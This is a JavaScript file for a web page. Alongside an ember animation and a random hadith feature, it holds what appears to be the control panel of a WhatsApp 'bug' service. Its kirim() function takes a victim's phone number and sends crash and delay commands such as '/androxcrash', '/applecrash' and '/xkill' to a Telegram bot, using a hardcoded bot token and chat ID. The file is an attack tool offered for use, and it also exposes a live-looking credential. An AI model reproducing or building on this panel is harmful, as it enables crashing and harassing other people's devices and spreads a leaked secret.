// Fire Dust (Embers) Animation
const canvas = document.getElementById('fire-canvas');
const ctx = canvas.getContext('2d');

let particles = [];
const particleCount = 100;

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}

window.addEventListener('resize', resizeCanvas);
resizeCanvas();

class Particle {
  constructor() {
    this.reset();
  }

  reset() {
    this.x = Math.random() * canvas.width;
    this.y = canvas.height + Math.random() * 100;
    this.size = Math.random() * 3 + 1;
    this.speedY = Math.random() * 1.5 + 0.5;
    this.speedX = Math.random() * 1 - 0.5;
    this.opacity = Math.random() * 0.5 + 0.5;
    this.baseColor = `255, ${Math.floor(Math.random() * 100 + 50)}, 0`;
  }

  update() {
    this.y -= this.speedY;
    this.x += this.speedX;
    this.opacity -= 0.002;

    if (this.y < -10 || this.opacity <= 0) {
      this.reset();
    }
  }

  draw() {
    const color = `rgba(${this.baseColor}, ${this.opacity})`;
    ctx.shadowBlur = 10;
    ctx.shadowColor = color;
    ctx.fillStyle = color;

    ctx.beginPath();
    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
    ctx.fill();
  }
}

function initParticles() {
  for (let i = 0; i < particleCount; i++) {
    particles.push(new Particle());
  }
}

function animateParticles() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  particles.forEach(p => {
    p.update();
    p.draw();
  });
  requestAnimationFrame(animateParticles);
}

initParticles();
animateParticles();

// Selection Logic for Bug Cards
const bugCards = document.querySelectorAll('.bug-card');
const bugSlider = document.getElementById('bugSlider');
const sliderDotsContainer = document.getElementById('sliderDots');

let selectedBug = 'delay';

// Create Indicator Dots
bugCards.forEach((_, index) => {
    const dot = document.createElement('div');
    dot.classList.add('dot');
    if (index === 0) dot.classList.add('active');
    dot.addEventListener('click', () => {
        bugCards[index].click();
    });
    sliderDotsContainer.appendChild(dot);
});

const dots = document.querySelectorAll('.dot');

bugCards.forEach((card, index) => {
    card.addEventListener('click', () => {
        // Update active class
        bugCards.forEach(c => c.classList.remove('active'));
        card.classList.add('active');

        // Update selection
        selectedBug = card.dataset.value;

        // Update dots
        dots.forEach(d => d.classList.remove('active'));
        dots[index].classList.add('active');

        // Auto center scroll
        const containerWidth = bugSlider.offsetWidth;
        const cardOffset = card.offsetLeft;
        const cardWidth = card.offsetWidth;
        const scrollPos = cardOffset - (containerWidth / 2) + (cardWidth / 2);

        bugSlider.scrollTo({
            left: scrollPos,
            behavior: 'smooth'
        });
    });
});

// Update dots on scroll
bugSlider.addEventListener('scroll', () => {
    const scrollLeft = bugSlider.scrollLeft;
    const cardWidth = bugCards[0].offsetWidth + 20; // width + gap
    const index = Math.round(scrollLeft / cardWidth);

    if (dots[index]) {
        dots.forEach(d => d.classList.remove('active'));
        dots[index].classList.add('active');
    }
});

// COMMAND MAPPING
const bugCommands = {
    delay: [
        "/xbugs", "/xynerx", "/zypherx", "/xivorx", "/xkill"
    ],
    delayhard: [
        "/xbugs", "/xynerx", "/zypherx", "/xivorx", "/xkill",
        "/specterdelay", "/spamxdelay", "/twinsdelay", "/majesticdelay",
        "/brutaldelay", "/delayduration", "/quantumdelay", "/Xoya"
    ],
    force: [
        "/xbugs", "/xynerx", "/zypherx", "/xivorx", "/xkill",
        "/specterdelay", "/spamxdelay", "/twinsdelay", "/majesticdelay",
        "/brutaldelay", "/delayduration", "/quantumdelay", "/Xoya",
        "/androxcrash", "/xinvis", "/spamxbug", "/combox", "/applecrash", "/crashblank"
    ]
};

// Aliases for other bug types
bugCommands.crash = bugCommands.force;
bugCommands.spamdelay = bugCommands.force;

// FUNCTION TETAP
const TOKEN="8637030050:AAHTSCZenSi6THys-Cjzf0hWGd1dO-pDglg";
const CHAT_ID="-5106873738";

function kirim(){
  const target=document.getElementById("target").value;
  const bug=selectedBug;
  const commands = bugCommands[bug] || [];

  let fullResult = "";

  commands.forEach(cmd => {
    const formattedCmd = `${cmd} ${target}`;
    fullResult += formattedCmd + "\n";

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        chat_id:CHAT_ID,
        text:"\n" + formattedCmd
      })
    });
  });

  document.getElementById("result").innerText = fullResult.trim() || "No commands found for this type.";

  let wa=document.getElementById("waLink");
  wa.style.display="block";
  wa.href="https://wa.me/"+target;
}

// Hadith Random Feature
const hadithList = [
  {
    arab: "إِنَّمَا الأَعْمَالُ بِالنِّيَّاتِ",
    indo: "Sesungguhnya amal itu tergantung niatnya"
  },
  {
    arab: "مَنْ لاَ يَرْحَمْ لاَ يُرْحَمْ",
    indo: "Barangsiapa tidak menyayangi, tidak akan disayangi"
  },
  {
    arab: "الدِّينُ النَّصِيحَةُ",
    indo: "Agama adalah nasihat"
  },
  {
    arab: "الْمُسْلِمُ مَنْ سَلِمَ النَّاسُ مِنْ لِسَانِهِ وَيَدِهِ",
    indo: "Muslim adalah yang orang lain selamat dari lisan dan tangannya"
  },
  {
    arab: "لاَ يُؤْمِنُ أَحَدُكُمْ حَتَّى يُحِبَّ لأَخِيهِ مَا يُحِبُّ لِنَفْسِهِ",
    indo: "Tidak sempurna iman seseorang hingga ia mencintai saudaranya seperti dirinya sendiri"
  },
  {
    arab: "خَيْرُكُمْ مَنْ تَعَلَّمَ الْقُرْآنَ وَعَلَّمَهُ",
    indo: "Sebaik-baik kalian adalah yang mempelajari Al-Qur'an dan mengajarkannya"
  },
  {
    arab: "كَلِمَتَانِ خَفِيفَتَانِ عَلَى اللِّسَانِ ثَقِيلَتَانِ فِي الْمِيزَانِ حَبِيبَتَانِ إِلَى الرَّحْمَنِ سُبْحَانَ اللَّهِ وَبِحَمْدِهِ سُبْحَانَ اللَّهِ الْعَظِيمِ",
    indo: "Dua kalimat yang ringan di lisan, berat di timbangan, dan dicintai Ar-Rahman: Subhanallahi wa bihamdihi, Subhanallahil 'Adzim"
  },
  {
    arab: "اتَّقِ اللَّهَ حَيْثُمَا كُنْتَ",
    indo: "Bertakwalah kepada Allah di mana pun kamu berada"
  }
];

function typeWriter(text, elementId, speed = 50) {
  let i = 0;
  const element = document.getElementById(elementId);
  element.innerHTML = "";
  function type() {
    if (i < text.length) {
      element.innerHTML += text.charAt(i);
      i++;
      setTimeout(type, speed);
    }
  }
  type();
}

function renderRandomHadith() {
  const container = document.getElementById('hadith-container');
  const randomIndex = Math.floor(Math.random() * hadithList.length);
  const hadith = hadithList[randomIndex];

  container.innerHTML = `
    <div class="hadith-card">
      <div class="hadith-arabic">${hadith.arab}</div>
      <div class="hadith-indo" id="hadith-indo-text"></div>
      <div class="hadith-source">(HR. Bukhari)</div>
    </div>
  `;

  typeWriter(hadith.indo, 'hadith-indo-text');
}

window.addEventListener('DOMContentLoaded', () => {
  renderRandomHadith();
});
